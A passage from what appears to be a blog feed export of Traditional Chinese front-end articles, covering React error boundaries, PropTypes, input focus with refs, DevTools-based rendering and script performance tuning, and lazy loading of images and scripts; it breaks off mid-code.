class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorBoundary</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">hasError</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">componentDidCatch</span>(<span class="params">error, info</span>) &#123;</span><br><span class="line">    <span class="comment">// You can also log the error to an error reporting service</span></span><br><span class="line">    <span class="title function_">logErrorToMyService</span>(error, info);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">getDerivedStateFromError</span>(<span class="params">error</span>) &#123;</span><br><span class="line">    <span class="comment">// Update state so the next render will show the fallback UI.</span></span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">hasError</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">hasError</span>) &#123;</span><br><span class="line">      <span class="comment">// You can render any custom fallback UI</span></span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&quot;Something went wrong.&quot;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">children</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>當撰寫完成後，使用上也非常簡單，只要把原來的元件包起來就好了，底下是範例</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ErrorBoundary</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">MyBugComponent</span> /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">ErrorBoundary</span>&gt;</span><br></pre></td></tr></table></figure><p>錯誤邊界在底下四種情形不會 catch 到錯誤</p><ul><li>在 Event handlers 中，只能夠自己寫 try catch</li><li>setTimeout 或 requestAnimationFrame 的 callbacks</li><li>伺服器渲染的過程</li><li>ErrorBoundary 沒寫好自己發生的錯誤</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyComponent</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">error</span>: <span class="literal">null</span> &#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">handleClick</span> = <span class="variable language_">this</span>.<span class="property">handleClick</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在 Event handlers 中，只能夠自己寫 try catch</span></span><br><span class="line">  <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// Do something that could throw</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123; error &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">error</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Caught an error.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="React-中要怎麼實作-Props-相關檢查"><a href="#React-中要怎麼實作-Props-相關檢查" class="headerlink" title="React 中要怎麼實作 Props 相關檢查?"></a>React 中要怎麼實作 Props 相關檢查?</h3><p>雖然 JavaScript 是弱型別的語言，但 React 內建 PropTypes check 機制，當 APP 處在開發模式下，React 會自動確認是否每個 props 都是如所設定的格式，若不正確 React 就會在命令列中產生警告的訊息，這個機制由於效能考量在 Production 環境中會被停用。</p><p>React 定義了底下十種型別:</p><ol><li><code>PropTypes.number</code></li><li><code>PropTypes.string</code></li><li><code>PropTypes.array</code></li><li><code>PropTypes.object</code></li><li><code>PropTypes.func</code></li><li><code>PropTypes.node</code></li><li><code>PropTypes.element</code></li><li><code>PropTypes.bool</code></li><li><code>PropTypes.symbol</code></li><li><code>PropTypes.any</code></li></ol><p>Props 中可分為必填和非必填，必填的後面則加上 <code>isRequired</code> 像是 <code>PropTypes.number.isRequired</code>，如果陣列中的物件需要定義則可以搭配使用 <code>React.PropTypes.shape()</code> 和 <code>React.PropTypes.arrayOf()</code>，如果 Props 會是變動的，也可以使用 <code>React.PropTypes.oneOfType()</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactComponent</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">arrayWithShape</span>: <span class="title class_">React</span>.<span class="property">PropTypes</span>.<span class="title function_">arrayOf</span>(</span><br><span class="line">    <span class="title class_">React</span>.<span class="property">PropTypes</span>.<span class="title function_">shape</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="title class_">React</span>.<span class="property">PropTypes</span>.<span class="property">string</span>.<span class="property">isRequired</span>,</span><br><span class="line">      <span class="attr">weight</span>: <span class="title class_">React</span>.<span class="property">PropTypes</span>.<span class="property">number</span>.<span class="property">isRequired</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">  ).<span class="property">isRequired</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactComponent</span>.<span class="property">PropTypes</span> = &#123;</span><br><span class="line">  <span class="attr">size</span>: <span class="title class_">PropTypes</span>.<span class="title function_">oneOfType</span>([<span class="title class_">PropTypes</span>.<span class="property">string</span>, <span class="title class_">PropTypes</span>.<span class="property">number</span>]),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="如何在頁面載入時自動-focus-在輸入框上"><a href="#如何在頁面載入時自動-focus-在輸入框上" class="headerlink" title="如何在頁面載入時自動 focus 在輸入框上?"></a>如何在頁面載入時自動 focus 在輸入框上?</h3><p>只需要幫 <code>input</code> 加上參照 <code>ref</code> 就可以在 <code>componentDidMount()</code> 後針對 <code>input</code> 進行操作。不過這種 inline function 的寫法在元件更新的時候因為底層的邏輯會被執行兩次，所以不被推薦。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">nameInput</span>.<span class="title function_">focus</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">defaultValue</span>=<span class="string">&#123;</span>&quot;<span class="attr">Won</span>&#x27;<span class="attr">t</span> <span class="attr">focus</span>&quot;&#125; /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">&#123;(input)</span> =&gt;</span> (this.nameInput = input)&#125;</span></span><br><span class="line"><span class="language-xml">          defaultValue=&#123;&quot;Will focus&quot;&#125;</span></span><br><span class="line"><span class="language-xml">        /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span><br></pre></td></tr></table></figure><p>比較推薦的寫法如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserForm</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  handleSubmit = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Input Value is: &quot;</span>, <span class="variable language_">this</span>.<span class="property">input</span>.<span class="property">value</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  setSearchInput = <span class="function">(<span class="params">input</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">input</span> = input;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onSubmit</span>=<span class="string">&#123;this.handleSubmit&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">ref</span>=<span class="string">&#123;this.setSearchInput&#125;</span> /&gt;</span> // Access DOM input in</span></span><br><span class="line"><span class="language-xml">        handle submit</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="同場加映"><a href="#同場加映" class="headerlink" title="同場加映"></a>同場加映</h3><p>在面試的整個流程中，其實有許多事情是可以多加強的，底下也列出幾篇文章，分享這幾年面試下來的心得給大家:</p><ul><li><a href="https://linyencheng.github.io/2023/01/26/career/what-questions-should-you-ask-the-interviewer/?utm_source=link&utm_medium=article&utm_campaign=internal_link">面試前端，你還有什麼問題想問嗎: 一起透過發問知己知彼找到理想生活</a></li><li><a href="/2020/08/17/thinking-resume/?utm_source=link&utm_medium=article&utm_campaign=internal_link">職場老鳥必點技能: 履歷診斷和優化履歷三步驟</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三步驟加速你的網站效能</title>
      <link href="/2021/03/11/experience-sharing-web-page-render-performance/"/>
      <url>/2021/03/11/experience-sharing-web-page-render-performance/</url>
      
        <content type="html"><![CDATA[<h2 id="三步驟加速你的網站效能"><a href="#三步驟加速你的網站效能" class="headerlink" title="三步驟加速你的網站效能"></a>三步驟加速你的網站效能</h2><p>當網站商業邏輯中有需要大量頻繁的快速更新畫面，往往會遇到畫面卡頓的情況，這時候就需要工程師進行執行效能上的優化。那該如何進行網頁執行效能優化呢? 接下來會從 Reconciliation &amp; Batch 概念解說開始，接著是運用 Chrome 開發者工具進行評估並進行</p><ol><li>渲染優化 (Rendering Performance)</li><li>腳本效能優化 (JavaScript Performance)</li></ol><p>如果還不太熟悉開發者工具的話，也可以先看看怎麼<a href="https://linyencheng.github.io/2018/12/04/tool-google-developer/">透過搶票按鈕來學習 Chrome 開發者工具除錯技巧 (Debug)</a>。</p><h3 id="Reconciliation-Batch-概念理解"><a href="#Reconciliation-Batch-概念理解" class="headerlink" title="Reconciliation &amp; Batch 概念理解"></a>Reconciliation &amp; Batch 概念理解</h3><p>當資料更新時，從解析 HTML + CSS 變成實際畫面的過程後會產生 Render Tree，接著經過 reFlow 計算出 Render Tree 上各個元素的物理屬性，如位置、大小、visible 等等，最後執行 Repaint 把算出來的結果畫到畫面上。</p><p>對使用 React 來說，React 提供了 <a href="https://zh-hant.reactjs.org/docs/reconciliation.html">Reconciliation</a> 這套機制來讓我們避免處理效能的問題，而每次呼叫 <code>render()</code> 函式的時候，React 會去幫我們比對儲存在記憶體中的 Dom Tree 去計算出需要更新哪個節點，那這個比對的演算機制就是 Reconciliation。</p><p>樹的差異比對目前時間最佳解是 O(n3)，React 則透過以下兩個假設來讓複雜度降成 O(n)。</p><blockquote><ol><li>兩個不同類型的 element 會產生出不同的 tree</li><li>開發者可以通過 <code>key</code> prop 來指出哪些子 element 在不同的 render 下能保持不變</li></ol></blockquote><p>Reconciliation 最重要的概念是如果能避免直接去頻繁修改 Dom 就能增加效能，不過對於 React 的開發者來說，常常也因為撰寫上的失誤導致 render 一再的被叫用，造成雖然減少了操作 Dom 的時間卻也增加了運算量。</p><p>從 Reconciliation 的解釋中就知道，這其實是一個將直接修改 Dom 的動作們進行一個 Batch 的概念，舉例來說今天如果把某個開關用程式快速開關十次，最後其實並不會看到開關在畫面上有任何的變化出現。</p><p>在 React 的生態系中 Redux 算是常見的狀態管理套件，而操作 Redux 的 <a href="https://react-redux.js.org/api/batch">react-redux 其實也提供了 batch 的功能</a>，目的都是希望讓 Render Tree 的操作盡可能降到最低。</p><h3 id="渲染優化-Rendering-Performance"><a href="#渲染優化-Rendering-Performance" class="headerlink" title="渲染優化 (Rendering Performance)"></a>渲染優化 (Rendering Performance)</h3><p>在開發者工具的 More Tool 中，Rendering Tab 這個功能就可以讓我們看出當資料更新或使用者進行操作時，有哪些部分會進行重新繪製。</p><blockquote><p>Rendering Tab<br><img src="/2021/03/11/experience-sharing-web-page-render-performance/rendering.png" alt="Rendering Tab"></p></blockquote><ul><li>Reflow: 會因為需要走完全部的 Render Tree 並逐步進行比對計算較耗資源，所以在程式撰寫上要避免觸發 Reflow</li><li>Repaint: 相對單純，只負責重新繪製到畫面上，所以在畫面更新上的寫法盡量以觸發 Repaint 為主</li></ul><p>舉例來說在 Hover 效果中加上了 <code>transform: scale(2);</code> 後，雖然這個效果只會觸發 Repaint，但如果沒有在外部容器補上 <code>overflow: hidden;</code> 或是限制最大寬高，在排版就蠻有可能會破版而觸發整個排版上的 Reflow 計算。</p><p>推薦 <a href="https://csstriggers.com/">csstriggers 這個網站</a>，如果想優化樣式的話，不妨可以到這個網站進行相關查詢。</p><blockquote><p>transform 的操作本身算是無害的<br><img src="/2021/03/11/experience-sharing-web-page-render-performance/transform.png" alt="transform"></p></blockquote><h3 id="腳本效能優化-JavaScript-Performance"><a href="#腳本效能優化-JavaScript-Performance" class="headerlink" title="腳本效能優化 (JavaScript Performance)"></a>腳本效能優化 (JavaScript Performance)</h3><p>關於 Performance 的優話 Chrome 的開發者工具提供了 Performance、Performance Monitor、Coverage 三個方便工具，透過這兩個工具找出兇手後，就可以考慮將長時間執行的 JavaScript 做演算法上的優化或從主執行緒移動至 Web Worker 去執行，甚至是直接延後載入。</p><ol><li>Performance Tab: 這個 Tab 提供某段期間的錄製，透過 Call Tree 看到最花時間的 Function 在哪裏，在腳本的優化上也才比較有一個可量測可評估的方向</li></ol><blockquote><p>Performance Tab<br><img src="/2021/03/11/experience-sharing-web-page-render-performance/performance-tab.png" alt="Performance Tab"></p></blockquote><ol start="2"><li>Performance Monitor: 則較適合邊手動測試並動態的觀察在什麼樣的操作底下會有處理器或是記憶體用量過大的情況</li></ol><blockquote><p>Performance Monitor<br><img src="/2021/03/11/experience-sharing-web-page-render-performance/performance-monitor.png" alt="Performance Monitor"></p></blockquote><ol start="3"><li>Coverage Tab: 這個 Tab 可以提供從網站載入到目前的操作總共運用了多少百分比的腳本，從這裡就可以觀察我們是否需要針對 Code splitting 做優化或是尋找套件的替代方案。</li></ol><blockquote><p>Coverage Tab<br><img src="/2021/03/11/experience-sharing-web-page-render-performance/coverage.png" alt="coverage"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四種加快網站開啟速度的常見方法</title>
      <link href="/2021/03/09/experience-sharing-web-page-loading-performance/"/>
      <url>/2021/03/09/experience-sharing-web-page-loading-performance/</url>
      
        <content type="html"><![CDATA[<h2 id="四種加快網站開啟速度的常見方法"><a href="#四種加快網站開啟速度的常見方法" class="headerlink" title="四種加快網站開啟速度的常見方法"></a>四種加快網站開啟速度的常見方法</h2><p>這篇文章會簡介加快網站開啟速度的四種常見方法，透過延遲載入資源、程式拆分、打包檔分析、資源優化幾個項目來作優化，並且用網站速度測試工具來進行檢核是否有效。</p><p>網站在載入效能上會遇到哪些問題?</p><ol><li>靜態資源過多載入過慢</li><li>腳本複雜執行時間過長</li><li>RWD 的設計造成樣式檔越來越大包</li></ol><h3 id="延遲載入資源-Lazy-Load"><a href="#延遲載入資源-Lazy-Load" class="headerlink" title="延遲載入資源 (Lazy Load)"></a>延遲載入資源 (Lazy Load)</h3><p>圖片的部份 npm 上有個套件叫 lazyload，用的招式其實就是修改了 img 圖片來源的 attribute，並透過觀察的方式把 attribute 換回來進行 lazyload。</p><p><code>&lt;img src=&quot;&lt;image-url&gt;&quot; width=400 height=400&gt;</code><br><code>&lt;img class=&quot;lazyload&quot; data-src=&quot;&lt;image-url&gt;&quot; width=400 height=400&gt;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// default settings</span></span><br><span class="line"><span class="keyword">const</span> defaults = &#123;</span><br><span class="line">    <span class="attr">src</span>: <span class="string">&quot;data-src&quot;</span>,</span><br><span class="line">    <span class="attr">srcset</span>: <span class="string">&quot;data-srcset&quot;</span>,</span><br><span class="line">    <span class="attr">selector</span>: <span class="string">&quot;.lazyload&quot;</span>,</span><br><span class="line">    <span class="attr">root</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">rootMargin</span>: <span class="string">&quot;0px&quot;</span>,</span><br><span class="line">    <span class="attr">threshold</span>: <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">images</span> = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="variable language_">this</span>.<span class="property">settings</span>.<span class="property">selector</span>);</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> observerConfig = &#123;</span><br><span class="line">    <span class="attr">root</span>: <span class="variable language_">this</span>.<span class="property">settings</span>.<span class="property">root</span>,</span><br><span class="line">    <span class="attr">rootMargin</span>: <span class="variable language_">this</span>.<span class="property">settings</span>.<span class="property">rootMargin</span>,</span><br><span class="line">    <span class="attr">threshold</span>: [<span class="variable language_">this</span>.<span class="property">settings</span>.<span class="property">threshold</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">observer</span> = <span class="keyword">new</span> <span class="title class_">IntersectionObserver</span>(<span class="keyword">function</span>(<span class="params">entries</span>) &#123;</span><br><span class="line">    <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>.<span class="title function_">call</span>(entries, <span class="keyword">function</span> (<span class="params">entry</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry.<span class="property">isIntersecting</span>) &#123;</span><br><span class="line">            self.<span class="property">observer</span>.<span class="title function_">unobserve</span>(entry.<span class="property">target</span>);</span><br><span class="line">            <span class="keyword">let</span> src = entry.<span class="property">target</span>.<span class="title function_">getAttribute</span>(self.<span class="property">settings</span>.<span class="property">src</span>);</span><br><span class="line">            <span class="keyword">let</span> srcset = entry.<span class="property">target</span>.<span class="title function_">getAttribute</span>(self.<span class="property">settings</span>.<span class="property">srcset</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;img&quot;</span> === entry.<span class="property">target</span>.<span class="property">tagName</span>.<span class="title function_">toLowerCase</span>()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (src) &#123;</span><br><span class="line">                    entry.<span class="property">target</span>.<span class="property">src</span> = src;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (srcset) &#123;</span><br><span class="line">                    entry.<span class="property">target</span>.<span class="property">srcset</span> = srcset;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                entry.<span class="property">target</span>.<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">&quot;url(&quot;</span> + src + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, observerConfig);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>.<span class="property">images</span>, <span class="keyword">function</span> (<span class="params">image</span>) &#123;</span><br><span class="line">    self.<span class="property">observer</span>.<span class="title function_">observe</span>(image);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="Script-載入方式-async-defer-lazyload"><a href="#Script-載入方式-async-defer-lazyload" class="headerlink" title="Script 載入方式 (async, defer, lazyload)"></a>Script 載入方式 (async, defer, lazyload)</h4><p>HTML5 <a href="https://developer.mozilla.org/zh-TW/docs/Web/HTML/Element/script"><code>&lt;script&gt;</code> tag</a> 中有多 async 和 defer 這兩個 attribute 可以使用，透過這兩個 attribute 我們可以非同步的去載入腳本，來加快網頁載入的速度。</p><h2 id="三種方法-async-defer-lazyload"><a href="#三種方法-async-defer-lazyload" class="headerlink" title="三種方法 (async, defer, lazyload)"></a>三種方法 (async, defer, lazyload)</h2><ul><li>async: 如果可以就非同步，不保證按照順序，若沒有相依性且拿來操作畫面，是最佳做法</li><li>defer: 頁面載入後都執行完才按照順序執行，可用來加速網頁載入</li><li>lazyload 用程式控制載入時機</li></ul><p><a href="https://developer.mozilla.org/zh-TW/docs/Games/Techniques/Async_scripts">async 按照 MDN 文件</a> 說明在 inline 的狀況不會有效果，必須帶有 src 屬性。:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> code;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.<span class="property">innerHTML</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><h2 id="使用程式懶載入"><a href="#使用程式懶載入" class="headerlink" title="使用程式懶載入"></a>使用程式懶載入</h2><p>透過程式來 lazyload 腳本，不想用新潮寫法的話透過以下簡單寫法就可以延後載入非必要的腳本，譬如在我部落格中的 diqus 就是透過這樣的方法進行 lazyload 的，我會偵測是否有捲動到某個特殊的 div 如果有才進行載入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadScript</span>(<span class="params">src, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  script.<span class="property">src</span> = src;</span><br><span class="line">  script.<span class="property">onload</span> = <span class="function">() =&gt;</span> <span class="title function_">callback</span>(script);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">append</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">loadScript</span>(<span class="string">&quot;/script.js&quot;</span>, <span class="keyword">function</span> (<span class="params">script</span>) &#123;</span><br><span class="line">  <span class="title function_">loadScript</span>(<span class="string">&quot;/script2.js&quot;</span>, <span class="keyword">function</span> (<span class="params">script</span>) &#123;</span><br><span class="line">    <span class="title function_">loadScript</span>(<span class="string">&quot;/script3.js&quot;</span>, <span class="keyword">function</span> (<span class="params">script</span>) &#123;&#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise 的範例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">newScript</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span 